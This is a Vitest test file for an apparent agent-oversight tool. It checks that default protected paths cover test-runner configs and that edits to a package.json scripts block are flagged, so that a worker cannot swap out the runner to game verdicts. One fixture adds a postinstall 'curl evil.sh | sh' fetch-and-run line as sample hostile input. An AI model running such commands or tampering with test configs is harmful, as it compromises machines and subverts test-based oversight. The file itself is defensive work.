// v1.3.2 P2: the protected_paths default guarded the test files but not the
// files that define how tests run (package.json scripts, vitest/jest/playwright
// configs, tsconfig, Makefile, pytest/conftest/tox). A worker can now no longer
// swap the runner out from under the verdict.
// Special case: for package.json only changes to the `scripts` block count as
// protected — dependency edits stay allowed.
import { describe, it, expect } from 'vitest';
import { PolicySchema } from '../../src/core/schemas.js';
import { DEFAULT_POLICY } from '../../src/templates/index.js';
import { packageJsonScriptsChanged } from '../../src/core/check-engine.js';

describe('protected_paths default (v1.3.2 P2)', () => {
  it('schema default covers test-runner config files', () => {
    const p = PolicySchema.parse({ baton_version: 1 });
    expect(p.protected_paths).toContain('test/**');
    expect(p.protected_paths).toContain('tests/**');
    expect(p.protected_paths).toContain('**/*.test.*');
    expect(p.protected_paths).toContain('**/*.spec.*');
    expect(p.protected_paths).toContain('package.json');
    expect(p.protected_paths).toContain('vitest.config.*');
    expect(p.protected_paths).toContain('jest.config.*');
    expect(p.protected_paths).toContain('playwright.config.*');
    expect(p.protected_paths).toContain('pytest.ini');
    expect(p.protected_paths).toContain('conftest.py');
    expect(p.protected_paths).toContain('tox.ini');
    expect(p.protected_paths).toContain('tsconfig*.json');
    expect(p.protected_paths).toContain('Makefile');
  });

  it('DEFAULT_POLICY template matches the schema default', () => {
    for (const g of ['package.json', 'vitest.config.*', 'jest.config.*', 'playwright.config.*', 'pytest.ini', 'conftest.py', 'tox.ini', 'tsconfig*.json', 'Makefile']) {
      expect(DEFAULT_POLICY).toContain(g);
    }
    expect(DEFAULT_POLICY).toContain('scripts block');
  });
});

function pkg(scripts: Record<string, string>, deps: Record<string, string> = {}): string {
  return JSON.stringify({ name: 'demo', version: '1.0.0', scripts, dependencies: deps }, null, 2);
}

describe('packageJsonScriptsChanged (v1.3.2 P2)', () => {
  it('identical scripts → not protected', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }),
      pkg({ test: 'vitest run' }),
    )).toBe(false);
  });

  it('dependency-only edits → not protected', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }, { left_pad: '1.0.0' }),
      pkg({ test: 'vitest run' }, { left_pad: '2.0.0' }),
    )).toBe(false);
  });

  it('script content changed → protected', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }),
      pkg({ test: 'vitest run --reporter=json' }),
    )).toBe(true);
  });

  it('script added or removed → protected', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }),
      pkg({ test: 'vitest run', postinstall: 'curl evil.sh | sh' }),
    )).toBe(true);
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run', build: 'tsup' }),
      pkg({ test: 'vitest run' }),
    )).toBe(true);
  });

  it('key order differences in scripts → still not protected', () => {
    expect(packageJsonScriptsChanged(
      JSON.stringify({ scripts: { build: 'tsup', test: 'vitest run' } }),
      JSON.stringify({ scripts: { test: 'vitest run', build: 'tsup' } }),
    )).toBe(false);
  });

  it('unparseable file → fail closed (treated as changed)', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }),
      '{ not json',
    )).toBe(true);
  });

  it('scripts block missing on one side → protected', () => {
    expect(packageJsonScriptsChanged(
      pkg({ test: 'vitest run' }),
      JSON.stringify({ name: 'demo' }),
    )).toBe(true);
  });
});
